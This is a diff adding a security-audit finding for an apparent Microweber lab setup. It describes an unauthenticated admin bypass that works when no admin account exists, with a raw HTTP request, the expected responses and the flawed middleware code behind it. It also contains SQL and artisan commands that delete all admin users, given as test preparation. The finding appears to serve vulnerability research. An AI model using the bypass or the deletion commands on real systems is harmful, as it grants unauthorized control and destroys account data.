@@ -1,0 +1,28 @@
+### F-004: Unauthenticated Admin Bypass — No Admin in DB
+### Severity: HIGH | Auth: None | Condition: No admin user in DB
+### Impact: Full admin panel access without credentials
+### NOTE: Relevant on fresh installs or wiped DB. Lab: delete admin user first to test.
+###
+### Pre-condition: DELETE FROM mw_users WHERE is_admin=1;
+### (or test on fresh container before first setup completes)
+
+GET /admin HTTP/1.1
+Host: localhost:8888
+User-Agent: Mozilla/5.0
+Accept: text/html
+Connection: close
+
+### EXPECTED (normal): 302 redirect to /admin/login
+### EXPECTED (bypass): 200 OK — admin panel loads with no auth
+###
+### WHY IT WORKS:
+###   Admin.php middleware lines 60-63:
+###     $hasNoAdmin = User::where('is_admin', 1)->limit(1)->count();
+###     if (!$hasNoAdmin) { return $next($request); }
+###   When count == 0 → middleware passes request through unconditionally
+
+---
+
+### To reset for testing (run inside container):
+###   docker exec microweber_lab php artisan tinker
+###   >>> \MicroweberPackages\User\Models\User::where('is_admin', 1)->delete();
